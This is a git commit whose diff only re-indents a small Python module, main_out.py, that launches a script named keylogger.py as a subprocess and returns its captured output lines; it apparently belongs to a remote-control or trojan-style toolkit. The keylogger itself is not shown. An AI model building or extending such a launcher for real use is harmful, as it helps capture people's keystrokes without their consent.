48c009176f40b917a5c46e70a2dd3f80896ae8ff
ebek0ichi <ebek0ichi@icloud.com>
2016-11-04 13:48:03 +0900

    a

--- modules/main_out.py
+++ modules/main_out.py
@@ -2,13 +2,13 @@ import subprocess, time, os, sys
 
 def run(**args):
 
-cmd = [sys.executable, 'keylogger.py']
+	cmd = [sys.executable, 'keylogger.py']
 
-p = subprocess.Popen(cmd,
-  stdout=subprocess.PIPE,
-  stderr=subprocess.STDOUT)
+	p = subprocess.Popen(cmd,
+  	stdout=subprocess.PIPE,
+  	stderr=subprocess.STDOUT)
 
 #for line in p.stdout:
 #    print line,
-for line in iter(p.stdout.readline, b''):
-  return str(line)
+	for line in iter(p.stdout.readline, b''):
+  		return str(line)
